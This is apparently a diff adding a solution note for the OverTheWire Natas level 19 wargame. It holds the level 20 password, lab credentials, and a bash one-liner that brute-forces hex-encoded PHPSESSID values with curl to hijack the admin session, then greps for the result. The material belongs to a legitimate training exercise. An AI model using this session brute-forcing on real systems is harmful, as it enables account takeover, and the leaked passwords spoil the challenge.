@@ -1,0 +1,6 @@
+#natas 20 eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+#get from this commands
+
+for i in {0..999}; do echo $(echo -n "$i-admin"| xxd -p); done | xargs -I % curl -s -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 'http://natas19.natas.labs.overthewire.org/index.php?debug=1&admin=1' --data 'username=admin&password=admin' --cookie "PHPSESSID=%" >> natas19_sessions
+
+grep -C 3 'Username: natas20' natas19_sessions
